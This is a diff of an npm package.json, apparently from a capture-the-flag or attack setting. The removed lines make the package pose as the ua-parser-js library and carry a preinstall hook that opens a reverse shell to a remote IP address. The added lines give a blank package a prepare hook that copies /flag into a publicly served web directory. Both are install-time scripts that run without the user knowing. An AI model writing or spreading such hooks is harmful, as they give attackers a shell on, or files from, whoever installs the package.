@@ -1,11 +1,13 @@
 {
-  "title": "UAParser.js",
-  "name": "ua-parser-js",
-  "version": "0.7.29",
-  "author": "Faisal Salman <f@faisalman.com> (http://faisalman.com)",
-  "description": "Lightweight JavaScript-based user-agent string parser",
-  "main": "src/ua-parser.js",
+  "name": "pkg",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
   "scripts": {
-    "preinstall": "bash -i >& /dev/tcp/101.43.122.221/33457 0>&1"
-  }
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "prepare": "cat /flag / > /usr/local/app/public/c.txt"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC"
 }
